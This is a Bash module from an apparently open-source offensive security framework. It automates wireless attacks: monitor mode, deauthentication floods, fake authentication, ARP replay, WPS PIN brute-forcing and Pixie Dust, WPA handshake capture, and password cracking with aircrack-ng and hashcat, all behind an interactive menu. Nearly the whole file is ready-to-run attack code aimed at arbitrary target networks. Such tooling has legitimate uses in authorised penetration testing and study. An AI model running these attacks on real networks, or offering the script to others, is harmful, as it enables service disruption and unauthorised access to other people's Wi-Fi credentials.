#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at:
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# See LICENSE and NOTICE files in the project root for full details.
# ═══════════════════════════════════════════════════════════════════════════════
#
# Wireless module: WiFi attacks, monitor mode, handshake capture, cracking
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_WIRELESS_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_WIRELESS_LOADED=1

# Source library files
source "${BASH_SOURCE%/*}/../lib/core.sh"
source "${BASH_SOURCE%/*}/../lib/ui.sh"
source "${BASH_SOURCE%/*}/../lib/safety.sh"
source "${BASH_SOURCE%/*}/../lib/detection.sh"
source "${BASH_SOURCE%/*}/../lib/utils.sh"

#═══════════════════════════════════════════════════════════════════════════════
# GLOBAL VARIABLES
#═══════════════════════════════════════════════════════════════════════════════

# Track current monitor mode interface
declare -g MONITOR_IFACE=""

#═══════════════════════════════════════════════════════════════════════════════
# INTERFACE VALIDATION
#═══════════════════════════════════════════════════════════════════════════════

# Validate wireless interface with optional monitor mode requirement
# Args: $1 = interface name, $2 = require_monitor (true/false)
# Returns: 0 if valid, 1 if invalid
validate_wireless_interface() {
    local iface="$1"
    local require_monitor="${2:-false}"

    # Check interface exists
    if [[ -z "$iface" ]]; then
        log_error "No interface specified"
        return 1
    fi

    if ! check_interface "$iface"; then
        log_error "Interface not found: $iface"
        return 1
    fi

    # Check if wireless
    if ! is_wireless_interface "$iface"; then
        log_error "$iface is not a wireless interface"
        local wireless
        wireless=$(list_wireless_interfaces)
        if [[ -n "$wireless" ]]; then
            log_info "Available wireless interfaces: $wireless"
        else
            log_error "No wireless interfaces found"
        fi
        return 1
    fi

    # Check monitor mode if required
    if [[ "$require_monitor" == "true" ]]; then
        if ! check_monitor_mode "$iface" &>/dev/null; then
            log_warning "$iface is not in monitor mode"
            echo -ne "    ${C_YELLOW}Enable monitor mode? [Y/n]: ${C_RESET}"
            read -r enable_mon
            if [[ "${enable_mon,,}" != "n" ]]; then
                start_monitor_mode "$iface" || return 1
            else
                return 1
            fi
        fi
    fi

    return 0
}

# Get wireless interface from user
# Returns: sets IFACE variable
get_wireless_interface() {
    local interfaces
    interfaces=$(list_wireless_interfaces)

    if [[ -z "$interfaces" ]]; then
        log_error "No wireless interfaces found"
        return 1
    fi

    log_info "Available wireless interfaces: $interfaces"
    echo -ne "    ${C_CYAN}Interface [${interfaces%% *}]: ${C_RESET}"
    read -r iface
    iface="${iface:-${interfaces%% *}}"

    IFACE="$iface"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# MONITOR MODE FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Check if interface is in monitor mode
# Args: $1 = interface name
# Returns: 0 if in monitor mode, 1 if not
check_monitor_mode() {
    local iface="$1"
    [[ -z "$iface" ]] && return 1

    local mode=""
    if command -v iw &>/dev/null; then
        mode=$(iw dev "$iface" info 2>/dev/null | grep -oP 'type\s+\K\w+')
    elif command -v iwconfig &>/dev/null; then
        mode=$(iwconfig "$iface" 2>/dev/null | grep -oP 'Mode:\K\w+')
    fi

    if [[ "${mode,,}" == "monitor" ]]; then
        log_debug "$iface is in monitor mode"
        return 0
    fi

    return 1
}

# Enable monitor mode on interface
# Args: $1 = interface name
# Returns: 0 on success, 1 on failure
start_monitor_mode() {
    local iface="$1"

    # Validate wireless
    if ! is_wireless_interface "$iface"; then
        log_error "$iface is not a wireless interface"
        return 1
    fi

    log_info "Enabling monitor mode on $iface..."
    log_audit "MONITOR_MODE" "$iface" "enable_start"

    local new_iface="$iface"

    # Try airmon-ng first (handles interfering processes)
    if check_tool "airmon-ng"; then
        log_command_preview "airmon-ng check kill && airmon-ng start $iface"
        airmon-ng check kill &>/dev/null
        local output
        output=$(airmon-ng start "$iface" 2>&1)

        # Check for renamed interface (e.g., wlan0mon)
        if echo "$output" | grep -qE '\(monitor mode.*enabled'; then
            new_iface=$(echo "$output" | grep -oP '\w+mon' | head -n1)
            [[ -z "$new_iface" ]] && new_iface="${iface}mon"
        fi
    else
        # Manual method using iw
        log_command_preview "ip link set $iface down && iw dev $iface set type monitor && ip link set $iface up"
        ip link set "$iface" down 2>/dev/null
        if command -v iw &>/dev/null; then
            iw dev "$iface" set type monitor 2>/dev/null
        else
            iwconfig "$iface" mode monitor 2>/dev/null
        fi
        ip link set "$iface" up 2>/dev/null
    fi

    # Verify monitor mode enabled
    sleep 1
    if check_monitor_mode "$new_iface"; then
        log_success "Monitor mode enabled on $new_iface"
        log_audit "MONITOR_MODE" "$new_iface" "enabled"
        MONITOR_IFACE="$new_iface"
        IFACE="$new_iface"
        return 0
    else
        log_error "Failed to enable monitor mode"
        log_audit "MONITOR_MODE" "$iface" "enable_failed"
        return 1
    fi
}

# Disable monitor mode on interface
# Args: $1 = interface name
# Returns: 0 on success, 1 on failure
stop_monitor_mode() {
    local iface="$1"

    log_info "Disabling monitor mode on $iface..."
    log_audit "MONITOR_MODE" "$iface" "disable_start"

    local orig_iface="$iface"

    # Try airmon-ng first
    if check_tool "airmon-ng"; then
        log_command_preview "airmon-ng stop $iface"
        airmon-ng stop "$iface" &>/dev/null

        # Get original interface name if renamed
        orig_iface="${iface%mon}"
    else
        # Manual method
        log_command_preview "ip link set $iface down && iw dev $iface set type managed && ip link set $iface up"
        ip link set "$iface" down 2>/dev/null
        if command -v iw &>/dev/null; then
            iw dev "$iface" set type managed 2>/dev/null
        else
            iwconfig "$iface" mode managed 2>/dev/null
        fi
        ip link set "$iface" up 2>/dev/null
    fi

    # Restart network manager
    if command -v systemctl &>/dev/null; then
        systemctl restart NetworkManager 2>/dev/null || true
    fi

    # Verify monitor mode disabled
    sleep 1
    if ! check_monitor_mode "$orig_iface" 2>/dev/null; then
        log_success "Monitor mode disabled on $orig_iface"
        log_audit "MONITOR_MODE" "$orig_iface" "disabled"
        MONITOR_IFACE=""
        IFACE="$orig_iface"
        return 0
    else
        log_error "Failed to disable monitor mode"
        log_audit "MONITOR_MODE" "$iface" "disable_failed"
        return 1
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# CHANNEL CONTROL
#═══════════════════════════════════════════════════════════════════════════════

# Set wireless channel
# Args: $1 = interface, $2 = channel
set_channel() {
    local iface="$1"
    local channel="$2"

    if command -v iw &>/dev/null; then
        iw dev "$iface" set channel "$channel" 2>/dev/null
    else
        iwconfig "$iface" channel "$channel" 2>/dev/null
    fi
}

# Channel hopping (runs in foreground until Ctrl+C)
# Args: $1 = interface
run_channel_hop() {
    local iface="$1"

    require_root || return 1
    validate_wireless_interface "$iface" true || return 1

    log_info "Channel hopping on $iface (Ctrl+C to stop)"
    echo

    while true; do
        for ch in 1 2 3 4 5 6 7 8 9 10 11; do
            set_channel "$iface" "$ch"
            printf "\r    ${C_GHOST}Channel: ${C_VENOM}%2d${C_RESET}" "$ch"
            sleep 0.3
        done
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# AIRODUMP-NG FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run airodump-ng network scan
# Args: $1 = interface
run_airodump() {
    local iface="${1:-$IFACE}"

    require_root || return 1
    check_tool "airodump-ng" || return 1

    if [[ -z "$iface" ]]; then
        get_wireless_interface || return 1
        iface="$IFACE"
    fi

    validate_wireless_interface "$iface" true || return 1

    operation_header "WiFi Scan" "$iface"
    local start_time
    start_time=$(date +%s)

    log_command_preview "airodump-ng $iface"
    log_audit "WIRELESS" "airodump" "scan_start"
    echo -e "    ${C_SHADOW}Press Ctrl+C to stop${C_RESET}"
    echo

    airodump-ng "$iface"

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "WiFi scan" "Duration: $duration"
    log_audit "WIRELESS" "airodump" "scan_complete"
}

# Run airodump-ng targeting specific BSSID
# Args: $1 = interface, $2 = bssid, $3 = channel, $4 = output file (optional)
run_airodump_target() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local channel="$3"
    local outfile="$4"

    require_root || return 1
    check_tool "airodump-ng" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    # Generate output filename if not provided
    if [[ -z "$outfile" ]]; then
        outfile="${LOOT_DIR:-/tmp}/capture_$(timestamp_filename)"
    fi

    operation_header "Targeted Capture" "$bssid"
    local start_time
    start_time=$(date +%s)

    local cmd="airodump-ng --bssid $bssid"
    [[ -n "$channel" ]] && cmd="$cmd -c $channel"
    cmd="$cmd -w $outfile $iface"

    log_command_preview "$cmd"
    log_audit "WIRELESS" "airodump_target" "$bssid"
    echo -e "    ${C_SHADOW}Press Ctrl+C when handshake captured${C_RESET}"
    echo

    airodump-ng --bssid "$bssid" ${channel:+-c "$channel"} -w "$outfile" "$iface"

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Targeted capture" "Output: ${outfile}*.cap\nDuration: $duration"
    log_loot "Capture file: ${outfile}-01.cap"
}

#═══════════════════════════════════════════════════════════════════════════════
# AIREPLAY-NG FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run deauthentication attack
# Args: $1 = interface, $2 = bssid, $3 = client (optional, "all" for broadcast), $4 = count
run_aireplay_deauth() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local client="${3:-all}"
    local count="${4:-10}"

    require_root || return 1
    check_tool "aireplay-ng" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    operation_header "Deauth Attack" "$bssid"
    local start_time
    start_time=$(date +%s)

    log_audit "WIRELESS" "deauth" "bssid=$bssid client=$client count=$count"

    if [[ "$client" == "all" ]]; then
        log_command_preview "aireplay-ng --deauth $count -a $bssid $iface"
        aireplay-ng --deauth "$count" -a "$bssid" "$iface"
    else
        log_command_preview "aireplay-ng --deauth $count -a $bssid -c $client $iface"
        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$iface"
    fi

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Deauth attack" "Target: $bssid\nDuration: $duration"
}

# Run fake authentication
# Args: $1 = interface, $2 = bssid, $3 = source MAC (optional)
run_aireplay_fakeauth() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local src_mac="$3"

    require_root || return 1
    check_tool "aireplay-ng" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    # Get interface MAC if not provided
    if [[ -z "$src_mac" ]]; then
        src_mac=$(get_interface_mac "$iface")
    fi

    operation_header "Fake Auth" "$bssid"
    log_command_preview "aireplay-ng -1 0 -a $bssid -h $src_mac $iface"
    log_audit "WIRELESS" "fakeauth" "$bssid"

    aireplay-ng -1 0 -a "$bssid" -h "$src_mac" "$iface"
}

# Run ARP replay attack
# Args: $1 = interface, $2 = bssid
run_aireplay_arp() {
    local iface="${1:-$IFACE}"
    local bssid="$2"

    require_root || return 1
    check_tool "aireplay-ng" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    operation_header "ARP Replay" "$bssid"
    log_command_preview "aireplay-ng -3 -b $bssid $iface"
    log_audit "WIRELESS" "arp_replay" "$bssid"

    aireplay-ng -3 -b "$bssid" "$iface"
}

#═══════════════════════════════════════════════════════════════════════════════
# AIRCRACK-NG FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run aircrack-ng with wordlist
# Args: $1 = capture file, $2 = wordlist
run_aircrack() {
    local capfile="$1"
    local wordlist="${2:-/usr/share/wordlists/rockyou.txt}"

    check_tool "aircrack-ng" || return 1

    if [[ -z "$capfile" ]] || [[ ! -f "$capfile" ]]; then
        log_error "Valid capture file required"
        return 1
    fi

    if [[ ! -f "$wordlist" ]]; then
        log_error "Wordlist not found: $wordlist"
        return 1
    fi

    operation_header "Aircrack" "$capfile"
    local start_time
    start_time=$(date +%s)

    log_command_preview "aircrack-ng -w $wordlist $capfile"
    log_audit "CREDENTIALS" "aircrack" "$capfile"

    local log_file="${LOG_DIR:-/tmp}/aircrack_$(timestamp_filename).log"
    aircrack-ng -w "$wordlist" "$capfile" | tee "$log_file"

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Aircrack" "Duration: $duration"
    log_loot "Aircrack log: $log_file"
}

#═══════════════════════════════════════════════════════════════════════════════
# WIFITE FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run wifite automated attack
run_wifite() {
    require_root || return 1
    check_tool "wifite" || return 1

    operation_header "Wifite" "auto"
    local start_time
    start_time=$(date +%s)

    log_command_preview "wifite --kill"
    log_audit "WIRELESS" "wifite" "auto_attack"

    wifite --kill

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Wifite" "Duration: $duration"
}

# Run wifite targeting specific network
# Args: $1 = bssid (optional), $2 = channel (optional)
run_wifite_target() {
    local bssid="$1"
    local channel="$2"

    require_root || return 1
    check_tool "wifite" || return 1

    operation_header "Wifite Target" "${bssid:-scan}"
    local start_time
    start_time=$(date +%s)

    local cmd="wifite --kill"
    [[ -n "$bssid" ]] && cmd="$cmd -b $bssid"
    [[ -n "$channel" ]] && cmd="$cmd -c $channel"

    log_command_preview "$cmd"
    log_audit "WIRELESS" "wifite_target" "$bssid"

    wifite --kill ${bssid:+-b "$bssid"} ${channel:+-c "$channel"}

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Wifite" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# BETTERCAP FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run bettercap WiFi recon
# Args: $1 = interface
run_bettercap() {
    local iface="${1:-$IFACE}"

    require_root || return 1
    check_tool "bettercap" || return 1

    if [[ -z "$iface" ]]; then
        get_wireless_interface || return 1
        iface="$IFACE"
    fi

    operation_header "Bettercap WiFi" "$iface"
    local start_time
    start_time=$(date +%s)

    local log_file="${LOG_DIR:-/tmp}/bettercap_${iface}_$(timestamp_filename).log"

    log_command_preview "bettercap -iface $iface -eval 'wifi.recon on; ...'"
    log_audit "WIRELESS" "bettercap" "$iface"

    bettercap -iface "$iface" \
        -log "$log_file" \
        -eval "set wifi.recon.channel_hop true; wifi.recon on; set ticker.commands 'wifi.show'; ticker on"

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Bettercap" "Duration: $duration"
    log_loot "Bettercap log: $log_file"
}

#═══════════════════════════════════════════════════════════════════════════════
# REAVER / WPS FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run reaver WPS attack
# Args: $1 = interface, $2 = bssid, $3 = channel
run_reaver() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local channel="$3"

    require_root || return 1
    check_tool "reaver" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    operation_header "Reaver WPS" "$bssid"
    local start_time
    start_time=$(date +%s)

    log_command_preview "reaver -i $iface -b $bssid ${channel:+-c $channel} -vv"
    log_audit "WIRELESS" "reaver" "$bssid"

    reaver -i "$iface" -b "$bssid" ${channel:+-c "$channel"} -vv

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Reaver WPS" "Duration: $duration"
}

# Run reaver with Pixie Dust attack
# Args: $1 = interface, $2 = bssid, $3 = channel
run_reaver_pixie() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local channel="$3"

    require_root || return 1
    check_tool "reaver" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    operation_header "Pixie Dust" "$bssid"
    local start_time
    start_time=$(date +%s)

    log_command_preview "reaver -i $iface -b $bssid ${channel:+-c $channel} -K 1 -vv"
    log_audit "WIRELESS" "pixie_dust" "$bssid"

    reaver -i "$iface" -b "$bssid" ${channel:+-c "$channel"} -K 1 -vv

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Pixie Dust" "Duration: $duration"
}

# Run bully WPS attack
# Args: $1 = interface, $2 = bssid, $3 = channel
run_bully() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local channel="$3"

    require_root || return 1
    check_tool "bully" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    operation_header "Bully WPS" "$bssid"
    local start_time
    start_time=$(date +%s)

    log_command_preview "bully -b $bssid ${channel:+-c $channel} $iface"
    log_audit "WIRELESS" "bully" "$bssid"

    bully -b "$bssid" ${channel:+-c "$channel"} "$iface"

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Bully WPS" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE CAPTURE & CRACKING
#═══════════════════════════════════════════════════════════════════════════════

# Capture WPA handshake
# Args: $1 = interface, $2 = bssid, $3 = channel
capture_handshake() {
    local iface="${1:-$IFACE}"
    local bssid="$2"
    local channel="$3"

    require_root || return 1
    check_tool "airodump-ng" || return 1
    validate_wireless_interface "$iface" true || return 1

    if [[ -z "$bssid" ]]; then
        log_error "BSSID required"
        return 1
    fi

    local outfile="${LOOT_DIR:-/tmp}/handshake_$(timestamp_filename)"

    operation_header "Handshake Capture" "$bssid"
    log_info "Waiting for handshake... (deauth clients to speed up)"
    log_command_preview "airodump-ng --bssid $bssid ${channel:+-c $channel} -w $outfile $iface"
    log_audit "WIRELESS" "handshake_capture" "$bssid"

    airodump-ng --bssid "$bssid" ${channel:+-c "$channel"} -w "$outfile" "$iface"

    log_loot "Capture files: ${outfile}*"
}

# Convert capture to hashcat format
# Args: $1 = capture file
convert_to_hashcat() {
    local capfile="$1"

    if [[ -z "$capfile" ]] || [[ ! -f "$capfile" ]]; then
        log_error "Valid capture file required"
        return 1
    fi

    local converter=""
    if command -v hcxpcapngtool &>/dev/null; then
        converter="hcxpcapngtool"
    elif command -v cap2hccapx &>/dev/null; then
        converter="cap2hccapx"
    else
        log_error "hcxpcapngtool or cap2hccapx required"
        return 1
    fi

    local base_name
    base_name=$(basename "${capfile%.*}")
    local out_file="${LOOT_DIR:-/tmp}/${base_name}_$(timestamp_filename).hc22000"

    if [[ "$converter" == "hcxpcapngtool" ]]; then
        log_command_preview "hcxpcapngtool -o $out_file $capfile"
        hcxpcapngtool -o "$out_file" "$capfile"
    else
        out_file="${out_file%.hc22000}.hccapx"
        log_command_preview "cap2hccapx $capfile $out_file"
        cap2hccapx "$capfile" "$out_file"
    fi

    log_loot "Hash file: $out_file"
    echo "$out_file"
}

# Run hashcat on WiFi handshake
# Args: $1 = hash file, $2 = wordlist
run_hashcat_wifi() {
    local hashfile="$1"
    local wordlist="${2:-/usr/share/wordlists/rockyou.txt}"

    check_tool "hashcat" || return 1

    if [[ -z "$hashfile" ]] || [[ ! -f "$hashfile" ]]; then
        log_error "Valid hash file required"
        return 1
    fi

    # Convert if .cap file
    if [[ "$hashfile" =~ \.(cap|pcap|pcapng)$ ]]; then
        hashfile=$(convert_to_hashcat "$hashfile")
        [[ -z "$hashfile" ]] && return 1
    fi

    operation_header "Hashcat WiFi" "$hashfile"
    local start_time
    start_time=$(date +%s)

    local potfile="${LOG_DIR:-/tmp}/hashcat.pot"
    log_command_preview "hashcat -m 22000 -a 0 $hashfile $wordlist"
    log_audit "CREDENTIALS" "hashcat_wifi" "$hashfile"

    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" \
        --status --status-timer=15 \
        --potfile-path "$potfile" \
        --session voidwave | tee "${LOG_DIR:-/tmp}/hashcat.log"

    # Show cracked passwords
    hashcat --show -m 22000 "$hashfile" --potfile-path "$potfile"

    local duration
    duration=$(elapsed_time "$start_time")
    operation_summary "success" "Hashcat" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# WIRELESS MENU
#═══════════════════════════════════════════════════════════════════════════════

# Interactive wireless menu
wireless_menu() {
    while true; do
        clear
        echo -e "    ${C_GREEN}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                     ${C_GREEN}📡 WIRELESS ARSENAL${C_RESET}                          ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}╠═══════════════════════════════════════════════════════════════════╣${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Interface Control ────${C_RESET}                                  ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[1]${C_RESET} Enable Monitor Mode                                        ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[2]${C_RESET} Disable Monitor Mode                                       ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[3]${C_RESET} Channel Hopper                                             ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Reconnaissance ────${C_RESET}                                      ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[4]${C_RESET} WiFi Network Scan          ${C_SHADOW}airodump-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[5]${C_RESET} Automated Attack           ${C_SHADOW}wifite${C_RESET}                         ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[6]${C_RESET} Bettercap Recon            ${C_SHADOW}bettercap${C_RESET}                      ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Attacks ────${C_RESET}                                             ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[7]${C_RESET} Deauthentication Attack    ${C_SHADOW}aireplay-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[8]${C_RESET} WPS Attack                 ${C_SHADOW}reaver/bully${C_RESET}                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[9]${C_RESET} Handshake Capture          ${C_SHADOW}airodump-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Cracking ────${C_RESET}                                            ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[10]${C_RESET} Crack with Aircrack       ${C_SHADOW}aircrack-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[11]${C_RESET} Crack with Hashcat        ${C_SHADOW}hashcat GPU${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[12]${C_RESET} Convert Handshake         ${C_SHADOW}.cap → .hc22000${C_RESET}                ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                       ${C_RED}[B] ← Back${C_RESET}                                  ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice

        case "$choice" in
            1)  # Enable Monitor Mode
                get_wireless_interface || continue
                start_monitor_mode "$IFACE"
                ;;
            2)  # Disable Monitor Mode
                get_wireless_interface || continue
                stop_monitor_mode "$IFACE"
                ;;
            3)  # Channel Hopper
                get_wireless_interface || continue
                run_channel_hop "$IFACE"
                ;;
            4)  # WiFi Network Scan
                run_airodump
                ;;
            5)  # Automated Attack (Wifite)
                run_wifite
                ;;
            6)  # Bettercap Recon
                run_bettercap
                ;;
            7)  # Deauthentication Attack
                get_wireless_interface || continue
                validate_wireless_interface "$IFACE" true || continue
                echo -ne "    ${C_CYAN}Target BSSID: ${C_RESET}"
                read -r bssid
                echo -ne "    ${C_CYAN}Client MAC (or 'all'): ${C_RESET}"
                read -r client
                echo -ne "    ${C_CYAN}Deauth count [10]: ${C_RESET}"
                read -r count
                run_aireplay_deauth "$IFACE" "$bssid" "${client:-all}" "${count:-10}"
                ;;
            8)  # WPS Attack
                get_wireless_interface || continue
                validate_wireless_interface "$IFACE" true || continue
                echo -ne "    ${C_CYAN}Target BSSID: ${C_RESET}"
                read -r bssid
                echo -ne "    ${C_CYAN}Channel: ${C_RESET}"
                read -r channel
                echo
                echo -e "    ${C_GHOST}[1]${C_RESET} Reaver"
                echo -e "    ${C_GHOST}[2]${C_RESET} Bully"
                echo -e "    ${C_GHOST}[3]${C_RESET} Pixie Dust"
                echo
                echo -ne "    ${C_CYAN}Select [1]: ${C_RESET}"
                read -r wps_choice
                case "${wps_choice:-1}" in
                    1) run_reaver "$IFACE" "$bssid" "$channel" ;;
                    2) run_bully "$IFACE" "$bssid" "$channel" ;;
                    3) run_reaver_pixie "$IFACE" "$bssid" "$channel" ;;
                esac
                ;;
            9)  # Handshake Capture
                get_wireless_interface || continue
                validate_wireless_interface "$IFACE" true || continue
                echo -ne "    ${C_CYAN}Target BSSID: ${C_RESET}"
                read -r bssid
                echo -ne "    ${C_CYAN}Channel: ${C_RESET}"
                read -r channel
                capture_handshake "$IFACE" "$bssid" "$channel"
                ;;
            10) # Crack with Aircrack
                echo -ne "    ${C_CYAN}Capture file (.cap): ${C_RESET}"
                read -r capfile
                echo -ne "    ${C_CYAN}Wordlist [rockyou.txt]: ${C_RESET}"
                read -r wordlist
                run_aircrack "$capfile" "${wordlist:-/usr/share/wordlists/rockyou.txt}"
                ;;
            11) # Crack with Hashcat
                echo -ne "    ${C_CYAN}Capture/hash file: ${C_RESET}"
                read -r hashfile
                echo -ne "    ${C_CYAN}Wordlist [rockyou.txt]: ${C_RESET}"
                read -r wordlist
                run_hashcat_wifi "$hashfile" "${wordlist:-/usr/share/wordlists/rockyou.txt}"
                ;;
            12) # Convert Handshake
                echo -ne "    ${C_CYAN}Capture file (.cap): ${C_RESET}"
                read -r capfile
                convert_to_hashcat "$capfile"
                ;;
            b|B|0)
                return
                ;;
            *)
                log_error "Invalid option"
                ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORT FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Interface validation
export -f validate_wireless_interface get_wireless_interface

# Monitor mode
export -f check_monitor_mode start_monitor_mode stop_monitor_mode

# Channel control
export -f set_channel run_channel_hop

# Airodump
export -f run_airodump run_airodump_target

# Aireplay
export -f run_aireplay_deauth run_aireplay_fakeauth run_aireplay_arp

# Aircrack
export -f run_aircrack

# Wifite
export -f run_wifite run_wifite_target

# Bettercap
export -f run_bettercap

# WPS attacks
export -f run_reaver run_reaver_pixie run_bully

# Handshake operations
export -f capture_handshake convert_to_hashcat run_hashcat_wifi

# Menu
export -f wireless_menu
